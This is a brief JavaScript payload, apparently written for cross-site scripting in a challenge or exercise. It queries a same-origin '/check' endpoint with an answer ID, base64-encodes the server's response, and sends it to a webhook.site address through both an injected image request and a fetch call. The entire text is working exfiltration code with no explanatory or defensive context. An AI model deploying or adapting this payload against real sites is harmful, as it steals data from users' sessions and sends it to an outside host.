var webhookUrl = "https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf";
var answerId = "f1eec86c-eb2c-483b-9b6e-c936e122b050";
fetch("/check", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: `answer_id=${answerId}`
})
.then(r => r.text())
.then(t => {
    const exfilUrl = `${webhookUrl}?dataImg=${encodeURIComponent(btoa(t))}`;
    const img = new Image();
    img.src = exfilUrl;
    document.body.appendChild(img);
    return fetch(`${webhookUrl}?dataFetch=${btoa(t)}`)
})